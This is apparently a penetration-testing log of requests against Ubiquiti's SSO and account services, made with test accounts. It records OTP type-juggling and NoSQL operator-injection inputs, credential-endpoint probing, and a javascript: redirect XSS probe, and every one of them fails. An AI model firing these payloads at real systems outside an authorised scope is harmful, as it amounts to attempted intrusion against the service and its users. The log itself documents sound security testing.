@@ -1,0 +1,64 @@
+# Session 29 traffic captures (2026-11-25)
+
+All requests used disposable test-account sessions (A/B). Tokens/cookies omitted for brevity.
+
+## OIDC discovery — sso.ui.com
+```
+GET /.well-known/openid-configuration  -> 200
+{"issuer":"https://sso.ui.com","jwks_uri":"https://sso.ui.com/.well-known/jwks.json",
+ "id_token_signing_alg_values_supported":["RS256"],"claims_supported":["sub","iss","exp"]}
+
+GET /.well-known/jwks.json -> 200  (single RSA-2048, alg RS256, use sig, kid MeSXSrMDx8WowjH6VV3CXbhkbfNKR6c1m8_US_dAJ_I)
+GET /oauth/authorize|token|userinfo, /api/sso/v1/oauth/authorize, /saml/metadata -> 404
+```
+
+## MSP IdP backend — fabric.svc.ui.com (A L1)
+```
+GET /api/fabrics/base/msp/v1/msp                     -> 403 {"code":"no_msp_membership"}
+GET /api/fabrics/base/msp/v1/idp                     -> 403 no_msp_membership
+GET /api/fabrics/base/msp/v1/idp/configuration       -> 403 no_msp_membership
+GET /api/fabrics/base/msp/v1/idp/credentials         -> 403 no_msp_membership   (unauth -> 401)
+GET /api/fabrics/base/msp/v1/idp/scim-token          -> 403 no_msp_membership   (unauth -> 401)
+GET /api/fabrics/base/msp/v1/idp/sync-targets        -> 403 no_msp_membership
+GET /api/fabrics/base/msp/v1/idp/sync-jobs/1         -> 403 no_msp_membership
+GET /api/fabrics/base/msp/v2/idp/directory/groups    -> 403 no_msp_membership
+GET /api/fabrics/base/msp/v1/logo                    -> 405
+```
+
+## Zendesk captcha gate — account.svc.ui.com (A L1)
+```
+POST /zendesk/search_tickets {"query":"","status":"open"}          -> 400 reCAPTCHA token was not provided
+POST /zendesk/search_tickets + x-captcha-token: dummy              -> 403 Did not pass reCAPTCHA validation
+POST /zendesk/search_ccd {"query":"","status":"all"}               -> 400 reCAPTCHA token was not provided
+GET  /zendesk/tickets?requester_id=<B uuid>                        -> 404 Not found
+```
+
+## Login / OTP type-juggling — sso.ui.com
+```
+POST /api/sso/v1/login/2fa {"token":""}            -> 400 {"token":["This field may not be blank."]}
+POST /api/sso/v1/login/2fa {"token":true}          -> 400 {"token":["Not a valid string."]}
+POST /api/sso/v1/login/2fa {"token":0}             -> 403 Invalid credential
+POST /api/sso/v1/login/2fa {"token":[""]}          -> 400 Not a valid string
+POST /api/sso/v1/login/2fa {"token":{"$ne":null}}  -> 400 Not a valid string
+POST /api/sso/v1/login/2fa {"token":{"$gt":""}}    -> 400 Not a valid string
+POST /api/sso/v1/login {"user":{"$ne":null},...}   -> 400 {"user":["Not a valid string."]}
+POST /api/sso/v1/login {"user":[...],...}          -> 400 Not a valid string
+POST /api/sso/v1/login/email {"user":[...]}        -> 429 RATE_LIMITED (shared limiter)
+```
+
+## Assurance level — sso.ui.com (A L1)
+```
+GET  /api/sso/v1/user/self/login/level                      -> 200 {"level":1,"time_left_seconds":0}
+POST /api/sso/v1/user/self/login/level {"password":"Wrong"}  -> 403 INVALID_CREDENTIAL
+POST /api/sso/v1/user/self/login/level {"password":""}       -> 400 field may not be blank
+POST /api/sso/v1/user/self/login/level {}                    -> 400 field is required
+POST /api/sso/v1/user/self/login/level/refresh {}            -> 499 L2_REQUIRED
+GET  /api/sso/v1/user/self/login/level (after)               -> 200 {"level":1,...}
+```
+
+## Runtime (Chrome DevTools MCP)
+```
+navigate https://account.ui.com/login -> title "Ubiquiti Account", body "Email or Username / Remember me / ..."
+navigate https://account.ui.com/login?redirect=javascript:alert('PM_TRACE_29')
+  -> final URL stays https://account.ui.com/login?redirect=javascript:alert(%27PM_TRACE_29%27); no dialog/execution
+```
